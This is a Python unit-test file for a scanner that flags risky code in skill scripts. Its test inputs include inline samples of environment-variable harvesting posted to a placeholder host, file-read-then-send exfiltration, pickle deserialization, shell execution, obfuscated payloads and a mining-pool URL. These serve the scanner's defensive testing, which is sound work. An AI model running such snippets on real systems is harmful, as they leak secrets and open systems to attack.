#!/usr/bin/env python3
"""Tests for openclaw_skill_guard.py."""

from __future__ import annotations

import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from openclaw_skill_guard import (
    compile_safe_regex,
    has_nested_repetition,
    scan_source,
    security_checks,
)


class OpenClawSkillGuardTests(unittest.TestCase):
    def test_detects_node_child_process_spawn_as_critical(self) -> None:
        src = 'import { spawn } from "node:child_process"\nspawn("node", ["server.js"])\n'
        findings = scan_source(src, "Infrastructure/scripts/test.ts")
        self.assertTrue(any(f.code == "security.node_exec" and f.level == "critical" for f in findings))

    def test_detects_shell_true_as_critical(self) -> None:
        src = 'subprocess.run("echo hi", shell=True)\n'
        findings = scan_source(src, "Infrastructure/scripts/test.py")
        codes = {f.code for f in findings}
        self.assertIn("security.shell_true", codes)
        self.assertTrue(any(f.level == "critical" for f in findings if f.code == "security.shell_true"))

    def test_detects_env_harvesting(self) -> None:
        src = "payload = str(os.environ)\nrequests.post('https://x.example', data=payload)\n"
        findings = scan_source(src, "Infrastructure/scripts/test.py")
        self.assertTrue(any(f.code == "security.env_harvesting" and f.level == "critical" for f in findings))

    def test_detects_env_harvesting_when_comment_contains_partial_pattern(self) -> None:
        src = (
            "# os.environ marker comment\n"
            "payload = str(os.environ)\n"
            "requests.post('https://x.example', data=payload)\n"
        )
        findings = scan_source(src, "Infrastructure/scripts/test.py")
        self.assertTrue(any(f.code == "security.env_harvesting" and f.level == "critical" for f in findings))

    def test_detects_file_read_plus_network_send(self) -> None:
        src = "data = Path('/tmp/secret.txt').read_text()\nrequests.post('https://x.example', data=data)\n"
        findings = scan_source(src, "Infrastructure/scripts/test.py")
        self.assertTrue(any(f.code == "security.potential_exfiltration" and f.level == "warn" for f in findings))

    def test_detects_unsafe_deserialization(self) -> None:
        src = "payload = pickle.loads(blob)\n"
        findings = scan_source(src, "Infrastructure/scripts/test.py")
        self.assertTrue(any(f.code == "security.unsafe_deserialization" and f.level == "critical" for f in findings))

    def test_allows_safe_yaml_loader_pattern(self) -> None:
        src = "obj = yaml.load(raw, Loader=yaml.SafeLoader)\n"
        findings = scan_source(src, "Infrastructure/scripts/test.py")
        self.assertFalse(any(f.code == "security.unsafe_deserialization" for f in findings))

    def test_detects_tls_verification_bypass(self) -> None:
        src = "requests.get(url, verify=False)\n"
        findings = scan_source(src, "Infrastructure/scripts/test.py")
        self.assertTrue(any(f.code == "security.tls_verification_disabled" and f.level == "warn" for f in findings))

    def test_detects_hex_obfuscation(self) -> None:
        src = 'payload = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65"\n'
        findings = scan_source(src, "Infrastructure/scripts/test.py")
        self.assertTrue(any(f.code == "security.hex_obfuscation" and f.level == "warn" for f in findings))

    def test_detects_large_base64_decode_payload(self) -> None:
        src = f'const data = atob("{"A" * 250}")\n'
        findings = scan_source(src, "Infrastructure/scripts/test.ts")
        self.assertTrue(any(f.code == "security.base64_obfuscation" and f.level == "warn" for f in findings))

    def test_detects_crypto_mining_reference(self) -> None:
        src = 'const pool = "stratum+tcp://pool.example.com:3333"\n'
        findings = scan_source(src, "Infrastructure/scripts/test.ts")
        self.assertTrue(any(f.code == "security.crypto_mining" and f.level == "critical" for f in findings))

    def test_detects_non_standard_websocket_port(self) -> None:
        src = 'const ws = new WebSocket("ws://remote.host:9999")\n'
        findings = scan_source(src, "Infrastructure/scripts/test.ts")
        self.assertTrue(any(f.code == "security.suspicious_websocket" and f.level == "warn" for f in findings))

    def test_detects_unsanitized_path_interpolation_in_prompt_builder(self) -> None:
        src = (
            "def buildReviewPrompt(workspace_dir):\n"
            "    return f'Review workspace at {workspace_dir}'\n"
        )
        findings = scan_source(src, "Infrastructure/scripts/test.py")
        self.assertTrue(
            any(
                f.code == "security.prompt_unsanitized_path_interpolation" and f.level == "warn"
                for f in findings
            )
        )

    def test_allows_sanitized_path_interpolation_in_prompt_builder(self) -> None:
        src = (
            "def buildReviewPrompt(workspace_dir):\n"
            "    safe = sanitize_for_prompt(workspace_dir)\n"
            "    return f'Review workspace at {safe}'\n"
        )
        findings = scan_source(src, "Infrastructure/scripts/test.py")
        self.assertFalse(any(f.code == "security.prompt_unsanitized_path_interpolation" for f in findings))

    def test_detects_os_tempdir_as_path_trust_boundary(self) -> None:
        src = (
            "base = Path(tempfile.gettempdir()).resolve()\n"
            "target = Path(user_path).resolve()\n"
            "if not _is_path_inside(base, target):\n"
            "    raise ValueError('outside temp')\n"
        )
        findings = scan_source(src, "Infrastructure/scripts/test.py")
        self.assertTrue(any(f.code == "security.tmpdir_trust_boundary" and f.level == "warn" for f in findings))

    def test_detects_risky_calls_on_regex_lines(self) -> None:
        # Dangerous call must not be suppressed just because re.compile appears on the same line.
        src = "compiled = re.compile('x') ; os.system('echo hi')\n"
        findings = scan_source(src, "Infrastructure/scripts/test.py")
        self.assertTrue(any(f.code == "security.os_system" for f in findings))

    def test_nested_repetition_guard(self) -> None:
        self.assertTrue(has_nested_repetition("(a+)+"))
        with self.assertRaises(ValueError):
            compile_safe_regex("(a+)+")

    def test_security_checks_respects_scan_limits(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            skill_dir = Path(tmp)
            scripts = skill_dir / "scripts"
            scripts.mkdir(parents=True, exist_ok=True)
            (scripts / "a.py").write_text("subprocess.run(cmd)\n", encoding="utf-8")
            (scripts / "b.py").write_text("os.system('echo nope')\n", encoding="utf-8")

            findings = security_checks(skill_dir, max_files=1, max_file_bytes=10000)
            # Only one file scanned, so we should not see both signatures.
            codes = {f.code for f in findings}
            self.assertTrue("security.subprocess_usage" in codes or "security.os_system" in codes)
            self.assertLess(len(codes.intersection({"security.subprocess_usage", "security.os_system"})), 2)

    def test_security_checks_scan_modern_typescript_extensions(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            skill_dir = Path(tmp)
            scripts = skill_dir / "scripts"
            scripts.mkdir(parents=True, exist_ok=True)
            (scripts / "runner.tsx").write_text('const ws = new WebSocket("ws://remote.host:9999")\n', encoding="utf-8")

            findings = security_checks(skill_dir, max_files=10, max_file_bytes=10000)
            self.assertTrue(any(f.code == "security.suspicious_websocket" for f in findings))


if __name__ == "__main__":
    unittest.main()
